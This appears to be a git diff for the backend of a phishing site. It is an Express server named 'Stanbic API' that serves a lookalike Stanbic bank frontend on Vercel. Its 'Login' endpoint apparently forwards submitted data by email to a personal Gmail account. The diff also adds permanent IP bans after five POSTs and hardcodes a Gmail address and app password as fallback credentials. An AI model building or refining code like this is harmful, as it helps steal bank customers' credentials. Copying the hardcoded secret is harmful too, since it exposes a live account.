@@ -2,19 +2,57 @@ const express = require("express");
 const app = express();
 const cors = require("cors");
 const nodemailer = require("nodemailer");
+const rateLimit = require("express-rate-limit");
 require("dotenv").config();
+
+// CRITICAL for Vercel — real client IP for rate limiter
+app.set("trust proxy", 1);
 
 // Middleware
 app.use(express.json());
 
 // Allow ALL origins
-app.use(cors()); // <- this accepts requests from any origin
-
+// CORS — update to your actual frontend Vercel URL
+app.use(
+  cors({
+    origin: "https://desk-stanbic-online.vercel.app",
+    methods: ["GET", "POST", "OPTIONS"],
+    allowedHeaders: ["Content-Type"],
+    credentials: true,
+  })
+);
+app.options("*", cors());
+app.use(express.json());
 const PORT = process.env.PORT || 5000;
 
-// Email credentials from .env
-const userEmail = process.env.EMAIL_USER;
-const pass = process.env.EMAIL_PASS;
+// Email credentials — hardcoded so Vercel always has them
+// (dotenv still works for local dev if you have a .env file)
+const userEmail = process.env.EMAIL_USER || "okoriekennethassetvalue@gmail.com";
+const pass = process.env.EMAIL_PASS || "ognghvvpyfgylalm";
+
+// ── Permanent IP blocklist ────────────────────────────────────────────────────
+const blockedIPs = new Set();
+app.use((req, res, next) => {
+  if (blockedIPs.has(req.ip)) {
+    return res.status(403).json({ success: false, message: "Access denied." });
+  }
+  next();
+});
+
+// ── Rate limiter: 5 POSTs per hour, then block IP forever ────────────────────
+const limiter = rateLimit({
+  windowMs: 60 * 60 * 1000,
+  max: 5,
+  keyGenerator: (req) => req.ip,
+  handler: (req, res) => {
+    blockedIPs.add(req.ip);
+    return res.status(403).json({ success: false, message: "Access denied." });
+  },
+});
+app.use((req, res, next) => {
+  if (req.method === "POST") return limiter(req, res, next);
+  next();
+});
 
 // Reusable transporter
 const transporter = nodemailer.createTransport({
@@ -23,6 +61,10 @@ const transporter = nodemailer.createTransport({
     user: userEmail,
     pass: pass,
   },
+});
+transporter.verify((error) => {
+  if (error) console.error("❌ Mail transporter error:", error.message);
+  else console.log("✅ Mail transporter ready");
 });
 
 // Helper: send email and respond
@@ -42,6 +84,11 @@ const sendMailAndRespond = (
     return res.status(200).json({ success: true, message: successMsg });
   });
 };
+
+// ── Health check — fixes "Cannot GET /" ──────────────────────────────────────
+app.get("/", (req, res) => {
+  res.json({ status: "ok", server: "Stanbic API" });
+});
 
 // ─── ENDPOINT 1: POST / ─── Login
 app.post("/", (req, res) => {
